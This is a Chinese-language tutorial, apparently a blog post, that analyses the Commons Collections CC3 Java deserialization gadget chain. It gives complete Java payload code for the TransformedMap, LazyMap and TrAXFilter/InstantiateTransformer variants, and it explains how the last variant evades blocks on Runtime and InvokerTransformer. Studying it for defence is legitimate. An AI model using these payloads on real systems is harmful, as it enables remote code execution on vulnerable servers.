在CC1和CC6中，触发恶意代码的方式是触发Runtime.getRuntime().exec()的方式来实现命令执行。

而在CC3中，是通过动态类加载的方式，来加载恶意的类，实现代码执行,
CC1和CC6是命令执行，而CC3是代码执行

在CC3链中，是利用ClassLoader.defineClass (字节码加载任意类),
直接来到ClassLoader 639行中的defineClass

<img width="2097" height="1468" alt="image" src="https://github.com/user-attachments/assets/d4e896a2-ebad-455e-bb27-12534e4ca428" />

ClassLoader.defineClass的作用是将我们提供的恶意字节码加载为Class对象。
那么刚好在commons-collections中的TemplatesImpl类中有调用这个东西

<img width="2097" height="1468" alt="image" src="https://github.com/user-attachments/assets/07f0e7be-9fbe-4e36-8bfc-8698e9fa4f6e" />

<img width="958" height="243" alt="image" src="https://github.com/user-attachments/assets/77efa73d-5ab4-4625-91ea-1dab2ebb7b98" />

那么继续查找这个defineClass方法,
发现在390行中的defineTransletClasses方法调用了defineClass

<img width="2097" height="1468" alt="image" src="https://github.com/user-attachments/assets/f3dc4cc5-ff76-4701-8a76-d571a6c9d1b1" />

继续往上寻找哪里调用了defineTransletClasses方法,
在446行的getTransletInstance方法调用了defineTransletClasses

<img width="2097" height="1468" alt="image" src="https://github.com/user-attachments/assets/df508ee1-db43-4084-896c-ed118d1bd45e" />

那么继续寻找getTransletInstance方法的调用,
发现在481行的newTransformer方法中有调用

<img width="2097" height="1468" alt="image" src="https://github.com/user-attachments/assets/d172f594-2abb-4c4a-8001-83ac78c2c7e6" />

而这个newTransformer方法是一个public方法
可以直接调用。

那么现在的调用链就是：

恶意代码-->ClassLoader.defineClass-->TemplatesImpl.defineTransletClasses-->getTransletInstance-->newTransformer

现在来构造一下恶意代码,
创建一个执行弹出计算器命令的类


<img width="844" height="411" alt="image" src="https://github.com/user-attachments/assets/0c5e9277-247e-4687-96d2-acd2553541c9" />

将这个类编译

<img width="2100" height="1468" alt="image" src="https://github.com/user-attachments/assets/42c1f3d6-02c1-414c-9edd-70d3ac92d7f1" />

最后产生的Test.class文件就是我们需要加载的恶意代码

<img width="1089" height="226" alt="image" src="https://github.com/user-attachments/assets/9a7d98f9-5041-4574-93a9-51be73d85cf5" />

Payload构造：

因为newTransformer是public方法，所以可以直接调用

<img width="1063" height="142" alt="image" src="https://github.com/user-attachments/assets/41726996-7427-4b59-a3d2-eaade5b95c72" />

现在就需要来给这条调用链中的参数一个个赋值，确保链子会执行到我们想要的地方。

从newTransformer开始，一个一个的看，哪些需要赋值。

newTransformer->getTransletInstance->defineTransletClasses->defineClass->代码执行

newTransformer好像并不需要赋值什么参数,
接下来看getTransletInstance

<img width="1194" height="259" alt="image" src="https://github.com/user-attachments/assets/0b496b16-746f-4f97-a500-c6a43a02044b" />

在getTransletInstance中有两个判断,

如果_name为空那就直接return了,
如果_class为空，那就调用defineTransletClasses()方法

我们的目的是要调用这个defineTransletClasses方法,
但是_name为空的话就直接return，不执行下面的代码了,
现在的需求就是，我们要让这个_name不为空，并且_class要为空。

<img width="1380" height="1251" alt="image" src="https://github.com/user-attachments/assets/446c9d8a-8ff4-463c-b5bd-5508f6f931c3" />

这个_name默认就是为空的，所以要进行赋值

<img width="694" height="115" alt="image" src="https://github.com/user-attachments/assets/a8415292-f323-4bb6-8b4a-3d63436fdeb7" />

这里是一个private，需要通过反射的方式来对name进行赋值

所以Payload为：

<img width="844" height="289" alt="image" src="https://github.com/user-attachments/assets/2f9b1908-5a7e-4996-b35a-390e94af699f" />

随便赋一个值，只要_name不为空就行了

那么赋值完之后就可以成功的走到我们想要的defineTransletClasses()方法,
现在再来看一下defineTransletClasses()方法需要写什么条件。

在这个defineTransletClasses()方法中 如果_bytecodes为空，那么就会报错,
我们在这个方法中的目的，是要让他调用下面414行中的

<img width="1650" height="1231" alt="image" src="https://github.com/user-attachments/assets/fa306ed1-ddf7-4377-911d-b73a4439f468" />

这个_bytecodes是一个二位数组

<img width="667" height="78" alt="image" src="https://github.com/user-attachments/assets/024f6649-57b9-4bda-9378-ae8183db2625" />

在414行中，_bytecodes[i]会被当作参数，传递给defineClass最后调用到最终的ClassLoader.dedineClass()中的第二个参数byte[] b

<img width="970" height="169" alt="image" src="https://github.com/user-attachments/assets/d17d7f77-5578-48d4-aaec-09443d53ce14" />

<img width="1968" height="1468" alt="image" src="https://github.com/user-attachments/assets/d6c44c92-ea45-485d-91c9-5d844da663bb" />

那么这个 _bytecodes传入的就是我们编译好的Test.class文件的字节码

Payload构造：

首先反射获取_bytecodes,
Files.readAllBytes来读取之前编写的恶意类的字节码，存储为byte[] code,
然后又将code转换为二维数组 byte[][] codes中,
最后设置_bytecodes的值

<img width="1861" height="583" alt="image" src="https://github.com/user-attachments/assets/2cd77c2d-a099-4678-9983-dc83e9fdc900" />

现在将_bytecodes赋值之后还不能成功执行,
在defineTransletClasses方法中还有一个_tfactoty没有赋值

<img width="1804" height="1128" alt="image" src="https://github.com/user-attachments/assets/90a361e4-9e1d-4477-af93-f8d651e0cbdf" />

查看发现是一个transient属性，transient属性是不能被序列化的

<img width="958" height="88" alt="image" src="https://github.com/user-attachments/assets/100d1733-3ff1-4f7b-980f-c1a3277c73ad" />

但是在TemplatesImpl中的readObject方法中有对_tfactory进行赋值

<img width="1242" height="979" alt="image" src="https://github.com/user-attachments/assets/3ff28c4c-549c-4c29-aa2d-f3dbf0cd11cf" />

readObject方法反序列化的时候会自动对_tfactory赋值，这样在反序列化的时候就不用考虑_tfactory为空了这不就是我们想要的吗？

Payload构造：

<img width="1861" height="609" alt="image" src="https://github.com/user-attachments/assets/24fbb35f-8251-4388-8ebf-a47abe002b66" />

尝试执行，发现报错了，空指针异常
在TemplatesImpl.defineTransletClasses()方法中

<img width="2100" height="1467" alt="image" src="https://github.com/user-attachments/assets/1c74dac0-65fa-4c42-842e-46a658b1a029" />

最后调试发现，在418行做了一个判断,
如果获取的Class的父类名字是ABSTRACT_TRANSLET那就赋值,
如果不是那就进入到了else，而else里面的 _auxClasses为null，所以就报错了

那这个ABSTRACT_TRANSLET是什么？

最后发现就是AbstractTranslet类

<img width="1122" height="124" alt="image" src="https://github.com/user-attachments/assets/af906506-a41c-44ae-81bf-ef18f6e141aa" />

那怎么样让他不进入到else里面呢？

直接让我们的恶意类extends继承一下这个AbstractTranslet类就可以了,
下面注解IDEA自动生成


<img width="1717" height="697" alt="image" src="https://github.com/user-attachments/assets/2a755496-1f47-4a49-8993-9f4182d8f586" />

重新编译一下。
再来调试

<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/f01104dc-d06e-41a2-ac5e-4c1ddb724dfe" />

成功弹出计算器,
那之后就可以利用CC1链的执行方式来执行我们构造的templates.newTransformer,
如果用CC1的执行方式，

那么调用链就是：

sun.reflect.annotation.AnnotationInvocationHandler#readObject
org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue
org.apache.commons.collections.map.TransformedMap#checkSetValue
org.apache.commons.collections.functors.ChainedTransformer#transform
org.apache.commons.collections.functors.InvokerTransformer#transform
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader.defineClass
java.lang.ClassLoader#defineClass

Payload：

需要修改 transformers数组里的内容,
传入templates,
在用InvokerTransformer调用newTransformer方法,
之后就和CC1一样，一直到readObject


<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/0fa45913-9656-4e6c-9621-8bdd0f5d6625" />

完整代码：

        TemplatesImpl templates = new TemplatesImpl();
        Class TemplateClass = templates.getClass();
        Field name = TemplateClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "123");


        Field bytecodes = TemplateClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\code-audit\\CC3\\target\\classes\\Test.class"));
        byte[][] codes = {code};
        bytecodes.set(templates,codes);


        Field tfactory = TemplateClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());


        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer", null,null),


        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


        HashMap<Object, Object> map = new HashMap();
        map.put("value", "test");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);


        Class aClass = forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);


        serialize(o);
        unserialize("ser.bin");
    }

LazyMap也同样的道理


<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/4bf12f3b-acb0-4f8a-952d-117d5cc6ef75" />

        TemplatesImpl templates = new TemplatesImpl();
        Class TemplateClass = templates.getClass();
        Field name = TemplateClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "123");


        Field bytecodes = TemplateClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\code-audit\\CC3\\target\\classes\\Test.class"));
        byte[][] codes = {code};
        bytecodes.set(templates,codes);

        Field tfactory = TemplateClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer", null,null),

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


        HashMap<Object, Object> map = new HashMap();
        Map<Object, Object> lazyMap = LazyMap.decorate(map, chainedTransformer);


        Class aClass = forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        InvocationHandler o = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Target.class, lazyMap);


        Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, o);


        Object o1 = annotationInvocationHandlerConstructor.newInstance(Override.class, proxyMap);


        serialize(o1);

        unserialize("ser.bin");
    }


在前面执行恶意代码的方式是通过，
实例化newTransformer来达到动态类加载，加载Test.class恶意类。
然后结合CC1的前半段链使用的。

但是在ysoserial中的CC3是通过了另外一个方式执行的，
在这条CC3中，最后执行命令的方式，是通过动态加载类来加载自己构造的恶意类，
这样的调用方式可以绕过一些场景，比如，Runtime被服务器禁止了。

那如果InvokerTransformer也被禁止了呢？

毕竟我们在上面的代码中，需要用到InvokerTransformer来调用newTransformer，
如果被禁止了，那也就无法执行后面的调用链了。


<img width="1345" height="172" alt="image" src="https://github.com/user-attachments/assets/978dd374-310a-4b75-9e72-c1735e4ecdf0" />

那现在根据ysoserial的CC3链，跟进查找用法，
哪里又调用了newTransformer

<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/223b32fe-4f10-4e2d-ba44-22076921bbc0" />

在TrAXFilter中有调用


<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/47a6b274-b25e-44e2-a26c-c01df08a35e8" />

它在这里直接接收一个templates然后调用newTransformer，
并且也是public修饰的，
也就是说，实例化TrAXFilter传入之前构造好的templates，也可以命令执行。


<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/a93a65af-a5f0-4aee-9cf9-2ee931684041" />

现在需要用到一个类 InstantiateTransformer

InstantiateTransformer 是 org.apache.commons.collections.functors.InstantiateTransformer 类，

属于 Apache Commons Collections 库的一部分。它实现了 Transformer 接口，用于通过反射实例化一个类的对象。

问题产生在InstantiateTransformer下的transform方法，
首先会判断传进来的input是否是class类型的，
如果是，那就获取参数类型的构造器，然后调构造函数。

如果不是class类型，就抛出异常，
iParamTypes：构造函数类型，
iArgs：构造函数的具体参数值


<img width="2140" height="1470" alt="image" src="https://github.com/user-attachments/assets/80208f68-2f52-4352-bc34-a92fd6252095" />

Payload构造：

首先创建一个InstantiateTransformer里面传入一个Class数组类型的Templates.class，第二个参数是Object类型的，也就是前面构造好的templates，
然后调用它的transform方法传入TrAXFilter.class

<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/b018a34b-d99d-4cdf-89fb-b413eee02ea0" />

最后还是可以结合CC1的ChainedTransformer来执行调用，

但是这条链子没有用到InvokerTransformer也没有直接调用Runtime，而是通过加载自己编写的恶意类的字节码来达到的代码执行。


<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/22a4b22d-af37-414f-b3c9-ec5c93e7d1a2" />


        TemplatesImpl templates = new TemplatesImpl();
        Class TemplateClass = templates.getClass();
        Field name = TemplateClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "123");

        Field bytecodes = TemplateClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\code-audit\\CC3\\target\\classes\\Test.class"));
        byte[][] codes = {code};
        bytecodes.set(templates,codes);

        Field tfactory = TemplateClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer,


        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap();
        map.put("value", "test");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
        Class aClass = forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);
        serialize(o);

        unserialize("ser.bin");

参考连接：

https://www.bilibili.com/video/BV1yP4y1p7N7
https://blog.csdn.net/qq_45305211/article/details/142443149
